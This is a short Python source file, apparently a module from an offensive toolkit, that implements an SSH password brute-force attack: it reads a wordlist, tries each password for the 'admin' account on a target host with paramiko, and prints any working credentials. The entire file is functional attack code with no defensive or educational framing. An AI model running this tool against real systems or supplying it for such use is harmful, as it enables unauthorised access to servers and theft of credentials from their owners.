import paramiko

class BruteForceModule:
    def attack(self, target, username="admin", password_file="./passwords.txt"):
        print(f"Performing brute force attack on {target}...")
        
        try:
            # Read passwords from file
            with open(password_file, "r") as file:
                passwords = file.readlines()
            
            # passwords = [
            #     "abs",
            #     "admin",
            #     "user@123",
            # ]

            # Try each password
            for password in passwords:
                password = password.strip()
                print(f"Trying password: {password}")
                
                if self.try_ssh_login(target, username, password):
                    print(f"[+] Success! Username: {username}, Password: {password}")
                    return
            print("[-] Brute force failed. No valid credentials found.")
        except Exception as e:
            print(f"[-] Error during brute force: {e}")

    def try_ssh_login(self, target, username, password):
        """Attempt SSH login with given credentials."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=3)
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            print(f"[-] SSH Error: {e}")
            return False
